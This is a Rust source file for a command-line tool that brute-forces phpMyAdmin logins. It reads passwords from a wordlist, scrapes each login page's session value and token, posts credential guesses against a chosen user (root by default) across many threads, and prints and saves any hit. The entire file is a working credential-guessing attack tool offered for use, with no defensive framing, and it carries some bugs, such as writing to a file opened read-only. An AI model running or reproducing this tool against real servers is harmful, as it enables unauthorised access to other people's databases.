use std::{path::{PathBuf, Path}, fs::File, sync::{Arc, RwLock}, io::{BufReader, BufRead, Write}};

use clap::Parser;
use lazy_static::lazy_static;
use regex::Regex;
use anyhow::{Result, anyhow, Context};
use serde::Serialize;

lazy_static! {
    static ref URL_REGEX: Regex = Regex::new(r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+").unwrap();
    static ref SESSION_PLUCK_REGEX: Regex = Regex::new("name=\"set_session\" value=\"(.+?)\"").unwrap();
    static ref TOKEN_PLUCK_REGEX: Regex = Regex::new("name=\"token\" value=\"(.+?)\"").unwrap();

    static ref NUM_CPUS: usize = num_cpus::get();
}

const MAGIC_AUTH_STRING: &str = "pmaAuth-1";

/// A multi-threaded wordlist based bruteforcer for PHPMyAdmin
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
#[clap(name = "PHPMyAdmin Bruteforce")]
#[clap(version = "0.1")]
#[clap(author = "Syed Ahkam <smahkam57@gmail.com>")]
#[clap(arg_required_else_help = true)]
struct Args {
    /// the http url of instance
    url: String,
    
    /// the wordlist of passwords
    wordlist: PathBuf,

    /// number of threads to use
    #[clap(short, long)]
    #[clap(default_value_t = *NUM_CPUS)]
    threads: usize,

    /// delay between requests in secs
    #[clap(short, long)]
    #[clap(default_value = "0.")]
    delay: f32,

    /// the user to bruteforce against
    #[clap(short, long)]
    #[clap(default_value = "root")]
    user: String,

    /// save the output to a file
    #[clap(short, long)]   
    #[clap(default_value = "result.txt")]
    output: PathBuf
}

#[derive(Debug, Clone, Serialize)]
struct LoginData {
    set_session: String,
    token: String,
    pma_username: String,
    pma_password: String
}

fn check_if_url_valid(url: String) -> Result<()> {
    match URL_REGEX.is_match(&url) {
        true => Ok(()),
        false => Err(anyhow!("invalid url: {:?}", url))
    }
}

fn pluck_session_value_from_html(html: &str) -> Result<&str> {
    Ok(SESSION_PLUCK_REGEX
            .captures(html)
            .ok_or(anyhow!("couldnt pluck session value"))? 
            .get(1)
            .unwrap()
            .as_str()
    )
}

fn pluck_token_value_from_html(html: &str) -> Result<&str> {
    Ok(TOKEN_PLUCK_REGEX
            .captures(html)
            .ok_or(anyhow!("couldnt pluck token value"))? 
            .get(1)
            .unwrap()
            .as_str()
    )
}

fn on_success(user: &str, pass: &str, output_filepath: &Path) {
    println!("[HIT] user={:?}, pass={:?} thread={}", user, pass, rayon::current_thread_index().unwrap());

    let mut output_file = File::open(output_filepath).unwrap();
    output_file.write(pass.as_bytes()).context("failed to write to output file").unwrap();
}

fn on_failure(user: &str, pass: &str) {
    println!("[FAIL] user={:?}, pass={:?} thread={}", user, pass, rayon::current_thread_index().unwrap());
}

fn attempt_login(url: &str, user: &str, output_file: &Path, pass: String, req_client: &reqwest::blocking::Client) -> bool {
    // Make an initial GET request and collect session data
    let get_resp = req_client.get(&*url)
        .send()
        .context("failed to send get request")
        .unwrap();
    
    // let cookies: Vec<_> = (&get_resp).cookies().collect();
    let get_resp_text = get_resp.text()
        .context("failed to fetch get resp")
        .unwrap();

    let set_session = pluck_session_value_from_html(&get_resp_text).unwrap().to_owned();
    let token = pluck_token_value_from_html(&get_resp_text).unwrap().to_owned();
    
    // Now attempt to make an actual login request imitating to be reusing the last session
    let user = &*user.clone();
    let post_resp = req_client.post(&*url)
        .json(&LoginData {
            set_session,
            token,
            pma_username: user.to_owned(),
            pma_password: pass.clone()
        })
        .send()
        .context("failed to send post request")
        .unwrap();
    
    // let cookies: Vec<_> = (&post_resp).cookies().collect();
    for cookie in (&post_resp).cookies() {
        if cookie.name().contains(MAGIC_AUTH_STRING) {
            on_success(user, &pass, output_file);

            return true;
        }
    }

    on_failure(user, &pass);
    return false;
}

fn main() -> Result<()> {
    let args = Args::parse();

    check_if_url_valid(args.url.clone())?;

    let wordlist_file = File::open(&args.wordlist).context(format!("wordlist file not found at: {:?}", args.wordlist))?;
    
    let thread_pool = rayon::ThreadPoolBuilder::new()
        .thread_name(|i| format!("phpmyadmin-bruteforce-{}", i))
        .num_threads(args.threads as usize)
        .panic_handler(|p| {
            println!("panic: {:#?}!", p);
        })
        .build()?;
   
    let url = Arc::new(args.url);
    let user = Arc::new(args.user);
    let delay = Arc::new(args.delay);
    let output_file = Arc::new(args.output);

    let req_client = reqwest::blocking::ClientBuilder::new()
        .cookie_store(true)
        .build().context("failed to create reqwest client").unwrap();
    
    let is_finished = Arc::new(RwLock::new(false));
    thread_pool.scope_fifo(|s| {
        for line in BufReader::new(wordlist_file).lines() {
            let url_cloned = url.clone();
            let user_cloned = user.clone();
            let req_client_cloned = req_client.clone();
            let delay_cloned = delay.clone();
            let output_file = output_file.clone();
            let is_finished_cloned = is_finished.clone();

            s.spawn_fifo(move |_| {
                match attempt_login(
                    &url_cloned,
                    &user_cloned,
                    &output_file,
                    line.context("failed to read line").unwrap(),
                    &req_client_cloned
                ) {
                    true => *is_finished_cloned.write().unwrap() = true,
                    false => ()
                };
            });
            s.spawn_fifo(move |_| std::thread::sleep(std::time::Duration::from_millis((*delay_cloned * 1000.) as u64)));
        }
    });

    // FIXME: think of a way to handle process exit on successful hit
    while thread_pool.current_thread_has_pending_tasks().is_some() {
        if *is_finished.read().unwrap() {
            println!("Done! Exiting..");
            break;
        }
    }
    drop(thread_pool);

    Ok(())
}
